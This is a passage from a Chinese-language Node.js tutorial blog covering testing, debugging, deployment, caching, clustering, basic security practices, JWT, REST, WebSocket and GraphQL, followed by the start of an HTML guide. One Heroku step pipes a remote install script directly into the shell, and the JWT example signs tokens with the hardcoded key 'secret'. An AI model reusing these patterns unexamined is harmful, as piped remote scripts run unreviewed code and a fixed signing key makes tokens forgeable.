class="hljs-property">to</span>.<span class="hljs-title function_">equal</span>(<span class="hljs-number">2</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="7-1-3-测试异步代码"><a href="#7-1-3-测试异步代码" class="headerlink" title="7.1.3 测试异步代码"></a>7.1.3 测试异步代码</h4><p>Mocha 支持测试异步代码，使用 <code>done</code> 回调或者 <code>async/await</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;Async Test&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;should test async code&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-number">42</span>), <span class="hljs-number">100</span>));<br>    <span class="hljs-title function_">expect</span>(result).<span class="hljs-property">to</span>.<span class="hljs-title function_">equal</span>(<span class="hljs-number">42</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="7-2-调试-Node-js-应用"><a href="#7-2-调试-Node-js-应用" class="headerlink" title="7.2 调试 Node.js 应用"></a>7.2 调试 Node.js 应用</h3><h4 id="7-2-1-使用-console-log-调试"><a href="#7-2-1-使用-console-log-调试" class="headerlink" title="7.2.1 使用 console.log 调试"></a>7.2.1 使用 <code>console.log</code> 调试</h4><p>最简单的调试方式是通过 <code>console.log()</code> 输出变量值和函数的执行情况。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Debugging: &#x27;</span>, someVariable);<br></code></pre></td></tr></table></figure><h4 id="7-2-2-使用-Node-js-内置调试器"><a href="#7-2-2-使用-Node-js-内置调试器" class="headerlink" title="7.2.2 使用 Node.js 内置调试器"></a>7.2.2 使用 <code>Node.js</code> 内置调试器</h4><p>Node.js 自带了调试器，允许开发者设置断点并逐步调试代码。</p><p><strong>启动调试模式：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">node inspect app.js<br></code></pre></td></tr></table></figure><h4 id="7-2-3-使用-VS-Code-调试-Node-js-应用"><a href="#7-2-3-使用-VS-Code-调试-Node-js-应用" class="headerlink" title="7.2.3 使用 VS Code 调试 Node.js 应用"></a>7.2.3 使用 <code>VS Code</code> 调试 Node.js 应用</h4><p><code>Visual Studio Code</code> 提供了强大的调试工具，允许直接在编辑器中设置断点并运行调试。</p><p><strong>配置 <code>launch.json</code>：</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;node&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Launch Program&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;program&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/app.js&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="8-部署与性能优化-1"><a href="#8-部署与性能优化-1" class="headerlink" title="8. 部署与性能优化"></a>8. 部署与性能优化</h2><p>Node.js 应用可以通过多种方式进行部署，如使用 <strong>PM2</strong>、<strong>Docker</strong> 或在 <strong>云平台</strong> 上进行托管。</p><h3 id="8-1-部署-Node-js-应用"><a href="#8-1-部署-Node-js-应用" class="headerlink" title="8.1 部署 Node.js 应用"></a>8.1 部署 Node.js 应用</h3><h4 id="8-1-1-使用-PM2-进行进程管理"><a href="#8-1-1-使用-PM2-进行进程管理" class="headerlink" title="8.1.1 使用 PM2 进行进程管理"></a>8.1.1 使用 <code>PM2</code> 进行进程管理</h4><p><code>PM2</code> 是一个强大的 Node.js 进程管理工具，支持自动重启、日志管理等功能。</p><p>安装 <code>PM2</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install pm2 -g<br></code></pre></td></tr></table></figure><p><strong>启动应用：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pm2 start app.js<br></code></pre></td></tr></table></figure><p><strong>查看应用状态：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pm2 status<br></code></pre></td></tr></table></figure><h4 id="8-1-2-Docker-部署-Node-js-应用"><a href="#8-1-2-Docker-部署-Node-js-应用" class="headerlink" title="8.1.2 Docker 部署 Node.js 应用"></a>8.1.2 Docker 部署 Node.js 应用</h4><p><strong>创建 <code>Dockerfile</code>：</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">FROM</span> node:<span class="hljs-number">14</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . .</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> npm install</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;node&quot;</span>, <span class="hljs-string">&quot;app.js&quot;</span>]</span><br></code></pre></td></tr></table></figure><p><strong>构建 Docker 镜像并运行：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t myapp .<br>docker run -p 3000:3000 myapp<br></code></pre></td></tr></table></figure><h4 id="8-1-3-在云平台上部署-Node-js"><a href="#8-1-3-在云平台上部署-Node-js" class="headerlink" title="8.1.3 在云平台上部署 Node.js"></a>8.1.3 在云平台上部署 Node.js</h4><p>Node.js 可以轻松部署到各种云平台，如 AWS、Heroku、Google Cloud 等。</p><p><strong>Heroku 部署步骤：</strong></p><ol><li><p>安装 Heroku CLI：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://cli-assets.heroku.com/install.sh | sh<br></code></pre></td></tr></table></figure></li><li><p>登录 Heroku：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">heroku login<br></code></pre></td></tr></table></figure></li><li><p>部署应用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">heroku create<br>git push heroku master<br></code></pre></td></tr></table></figure></li></ol><h3 id="8-2-性能优化与缓存"><a href="#8-2-性能优化与缓存" class="headerlink" title="8.2 性能优化与缓存"></a>8.2 性能优化与缓存</h3><h4 id="8-2-1-使用-Redis-缓存"><a href="#8-2-1-使用-Redis-缓存" class="headerlink" title="8.2.1 使用 Redis 缓存"></a>8.2.1 使用 Redis 缓存</h4><p>Redis 是一种内存数据结构存储，常用于缓存数据以减少数据库压力。</p><p>安装 Redis 客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install redis<br></code></pre></td></tr></table></figure><p><strong>连接 Redis 并设置缓存：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> redis = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;redis&#x27;</span>);<br><span class="hljs-keyword">const</span> client = redis.<span class="hljs-title function_">createClient</span>();<br><br>client.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, redis.<span class="hljs-property">print</span>);<br>client.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, reply</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(reply);  <span class="hljs-comment">// 输出: value</span><br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="8-2-2-内存优化与垃圾回收"><a href="#8-2-2-内存优化与垃圾回收" class="headerlink" title="8.2.2 内存优化与垃圾回收"></a>8.2.2 内存优化与垃圾回收</h4><p>Node.js 是基于 V8 引擎的，V8 自带了垃圾回收机制，但在大数据处理时需要注意内存管理。</p><p><strong>检测内存使用情况：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(process.<span class="hljs-title function_">memoryUsage</span>());<br></code></pre></td></tr></table></figure><h4 id="8-2-3-使用集群模式提高性能"><a href="#8-2-3-使用集群模式提高性能" class="headerlink" title="8.2.3 使用集群模式提高性能"></a>8.2.3 使用集群模式提高性能</h4><p>Node.js 单线程模型可以通过 <strong>Cluster 模式</strong> 利用多核 CPU 提高性能。</p><p><strong>使用 <code>cluster</code> 模块创建多进程：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> cluster = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cluster&#x27;</span>);<br><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;os&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (cluster.<span class="hljs-property">isMaster</span>) &#123;<br>  <span class="hljs-keyword">const</span> numCPUs = os.<span class="hljs-title function_">cpus</span>().<span class="hljs-property">length</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Master process running, spawning <span class="hljs-subst">$&#123;numCPUs&#125;</span> workers...`</span>);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numCPUs; i++) &#123;<br>    cluster.<span class="hljs-title function_">fork</span>();<br>  &#125;<br>  <br>  cluster.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">worker, code, signal</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Worker <span class="hljs-subst">$&#123;worker.process.pid&#125;</span> died.`</span>);<br>  &#125;);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello from worker\n&#x27;</span>);<br>  &#125;).<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>);<br>  <br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Worker <span class="hljs-subst">$&#123;process.pid&#125;</span> started`</span>);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="9-安全性-1"><a href="#9-安全性-1" class="headerlink" title="9. 安全性"></a>9. 安全性</h2><p>Node.js 的安全性在 Web 应用中至关重要，常见的威胁包括 <strong>注入攻击</strong>、<strong>跨站脚本攻击 (XSS)</strong> 和 <strong>CSRF</strong>。</p><h3 id="9-1-安全性最佳实践"><a href="#9-1-安全性最佳实践" class="headerlink" title="9.1 安全性最佳实践"></a>9.1 安全性最佳实践</h3><h4 id="9-1-1-防止注入攻击"><a href="#9-1-1-防止注入攻击" class="headerlink" title="9.1.1 防止注入攻击"></a>9.1.1 防止注入攻击</h4><p>避免直接拼接用户输入的数据，使用参数化查询防止 SQL 注入。</p><p><strong>使用参数化查询：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">connection.<span class="hljs-title function_">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE id = ?&#x27;</span>, [userId], <span class="hljs-function">(<span class="hljs-params">err, results</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="9-1-2-防止跨站脚本攻击-XSS"><a href="#9-1-2-防止跨站脚本攻击-XSS" class="headerlink" title="9.1.2 防止跨站脚本攻击 (XSS)"></a>9.1.2 防止跨站脚本攻击 (XSS)</h4><p>使用输入校验、输出编码和安全库（如 <code>helmet.js</code>）防止 XSS 攻击。</p><p><strong>输出编码：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sanitizedData = <span class="hljs-title function_">escapeHtml</span>(userInput);<br></code></pre></td></tr></table></figure><h4 id="9-1-3-使用-helmet-js-保护应用"><a href="#9-1-3-使用-helmet-js-保护应用" class="headerlink" title="9.1.3 使用 helmet.js 保护应用"></a>9.1.3 使用 <code>helmet.js</code> 保护应用</h4><p><code>helmet.js</code> 是用于保护 Express 应用的安全库。</p><p>安装 <code>helmet</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install helmet<br></code></pre></td></tr></table></figure><p><strong>在 Express 中使用：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> helmet = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;helmet&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">helmet</span>());<br></code></pre></td></tr></table></figure><h3 id="9-2-身份验证与授权"><a href="#9-2-身份验证与授权" class="headerlink" title="9.2 身份验证与授权"></a>9.2 身份验证与授权</h3><h4 id="9-2-1-使用-JWT-进行身份验证"><a href="#9-2-1-使用-JWT-进行身份验证" class="headerlink" title="9.2.1 使用 JWT 进行身份验证"></a>9.2.1 使用 JWT 进行身份验证</h4><p>JWT (JSON Web Token) 是一种轻量级的身份验证机制，通常用于</p><p> API 身份认证。</p><p>安装 <code>jsonwebtoken</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install jsonwebtoken<br></code></pre></td></tr></table></figure><p><strong>生成 JWT：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">userId</span>: <span class="hljs-number">123</span> &#125;, <span class="hljs-string">&#x27;secret&#x27;</span>, &#123; <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">&#x27;1h&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><h4 id="9-2-2-OAuth-与第三方登录集成"><a href="#9-2-2-OAuth-与第三方登录集成" class="headerlink" title="9.2.2 OAuth 与第三方登录集成"></a>9.2.2 OAuth 与第三方登录集成</h4><p>OAuth 是一种授权协议，常用于集成第三方登录（如 Google、Facebook）。</p><p>使用 <code>passport.js</code> 库实现 OAuth 登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install passport passport-google-oauth<br></code></pre></td></tr></table></figure><hr><h2 id="10-实战项目-1"><a href="#10-实战项目-1" class="headerlink" title="10. 实战项目"></a>10. 实战项目</h2><h3 id="10-1-构建-RESTful-API"><a href="#10-1-构建-RESTful-API" class="headerlink" title="10.1 构建 RESTful API"></a>10.1 构建 RESTful API</h3><p>构建 RESTful API 是 Node.js 的常见应用场景之一。以下是使用 <code>Express</code> 框架构建 RESTful API 的基础示例。</p><h4 id="10-1-1-RESTful-API-基础"><a href="#10-1-1-RESTful-API-基础" class="headerlink" title="10.1.1 RESTful API 基础"></a>10.1.1 RESTful API 基础</h4><p><strong>定义基本路由：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/users&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Get all users&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/users&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Create a new user&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on port 3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="10-2-实现-WebSocket-通信"><a href="#10-2-实现-WebSocket-通信" class="headerlink" title="10.2 实现 WebSocket 通信"></a>10.2 实现 WebSocket 通信</h3><p>WebSocket 是一种在客户端和服务器之间实现全双工通信的协议，适合实时应用。</p><h4 id="10-2-1-WebSocket-基础"><a href="#10-2-1-WebSocket-基础" class="headerlink" title="10.2.1 WebSocket 基础"></a>10.2.1 WebSocket 基础</h4><p>Node.js 可以使用 <code>ws</code> 模块实现 WebSocket 通信。</p><p>安装 <code>ws</code> 模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install ws<br></code></pre></td></tr></table></figure><p><strong>创建 WebSocket 服务器：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">WebSocket</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ws&#x27;</span>);<br><span class="hljs-keyword">const</span> wss = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>.<span class="hljs-title class_">Server</span>(&#123; <span class="hljs-attr">port</span>: <span class="hljs-number">8080</span> &#125;);<br><br>wss.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">ws</span>) =&gt;</span> &#123;<br>  ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">message</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Received: %s&#x27;</span>, message);<br>  &#125;);<br>  ws.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Hello WebSocket Client!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="10-2-2-使用-ws-实现-WebSocket-服务"><a href="#10-2-2-使用-ws-实现-WebSocket-服务" class="headerlink" title="10.2.2 使用 ws 实现 WebSocket 服务"></a>10.2.2 使用 <code>ws</code> 实现 WebSocket 服务</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">wss.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">ws</span>) =&gt;</span> &#123;<br>  ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">message</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Received: %s&#x27;</span>, message);<br>    ws.<span class="hljs-title function_">send</span>(<span class="hljs-string">`Echo: <span class="hljs-subst">$&#123;message&#125;</span>`</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="10-3-使用-GraphQL-构建-API"><a href="#10-3-使用-GraphQL-构建-API" class="headerlink" title="10.3 使用 GraphQL 构建 API"></a>10.3 使用 GraphQL 构建 API</h3><p>GraphQL 是一种灵活的数据查询语言，适合复杂查询的 API 设计。</p><h4 id="10-3-1-GraphQL-概述"><a href="#10-3-1-GraphQL-概述" class="headerlink" title="10.3.1 GraphQL 概述"></a>10.3.1 GraphQL 概述</h4><p>GraphQL 提供了查询、变更和订阅功能，允许客户端请求所需的数据。</p><h4 id="10-3-2-使用-Apollo-Server-构建-GraphQL-API"><a href="#10-3-2-使用-Apollo-Server-构建-GraphQL-API" class="headerlink" title="10.3.2 使用 Apollo Server 构建 GraphQL API"></a>10.3.2 使用 Apollo Server 构建 GraphQL API</h4><p>安装 <code>apollo-server</code> 和 <code>graphql</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install apollo-server graphql<br></code></pre></td></tr></table></figure><p><strong>定义 Schema 和 Resolvers：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">ApolloServer</span>, gql &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;apollo-server&#x27;</span>);<br><br><span class="hljs-keyword">const</span> typeDefs = gql`<span class="language-graphql"></span><br><span class="language-graphql">  <span class="hljs-keyword">type</span> <span class="hljs-keyword">Query</span> <span class="hljs-punctuation">&#123;</span></span><br><span class="language-graphql">    <span class="hljs-symbol">hello</span><span class="hljs-punctuation">:</span> String</span><br><span class="language-graphql">  <span class="hljs-punctuation">&#125;</span></span><br><span class="language-graphql">`</span>;<br><br><span class="hljs-keyword">const</span> resolvers = &#123;<br>  <span class="hljs-title class_">Query</span>: &#123;<br>    <span class="hljs-attr">hello</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">&#x27;Hello, GraphQL!&#x27;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApolloServer</span>(&#123; typeDefs, resolvers &#125;);<br><br>server.<span class="hljs-title function_">listen</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">&#123; url &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server ready at <span class="hljs-subst">$&#123;url&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><hr><h1 id="HTML-详尽入门指南"><a href="#HTML-详尽入门指南" class="headerlink" title="HTML 详尽入门指南"></a>HTML 详尽入门指南</h1><h3 id="目录-4"><a href="#目录-4" class="headerlink" title="目录"></a>目录</h3><ol><li><a href="#html-%E5%9F%BA%E7%A1%80">HTML 基础</a><ul><li><a href="#html-%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">HTML 文件结构</a></li><li><a href="#html-%E6%A0%87%E8%AE%B0%E6%A0%87%E7%AD%BE">HTML 标记（标签）</a></li></ul></li><li><a href="#html-%E5%85%83%E7%B4%A0%E8%AF%A6%E8%A7%A3">HTML 元素详解</a><ul><li><a href="#%E6%A0%87%E9%A2%98headings">标题（Headings）</a></li><li><a href="#%E6%AE%B5%E8%90%BDparagraphs">段落（Paragraphs）</a></li><li><a href="#%E9%93%BE%E6%8E%A5links">链接（Links）</a></li><li><a href="#%E5%9B%BE%E5%83%8Fimages">图像（Images）</a></li><li><a href="#%E5%88%97%E8%A1%A8lists">列表（Lists）</a></li></ul></li><li><a href="#html-%E8%A1%A8%E5%8D%95">HTML 表单</a><ul><li><a href="#%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0">表单元素</a></li><li><a href="#%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4">表单提交</a></li></ul></li><li><a href="#html-%E8%A1%A8%E6%A0%BC">HTML 表格</a></li><li><a href="#html-%E5%A4%9A%E5%AA%92%E4%BD%93">HTML 多媒体</a></li><li><a href="#html-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80">HTML 基本布局</a></li></ol><hr><h3 id="HTML-基础"><a href="#HTML-基础" class="headerlink" title="HTML 基础"></a>HTML 基础</h3><h4 id="HTML-文件结构"><a href="#HTML-文件结构" class="headerlink" title="HTML 文件结构"></a>HTML 文件结构</h4><p>一个完整的 HTML 文档包括以下基本结构：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span 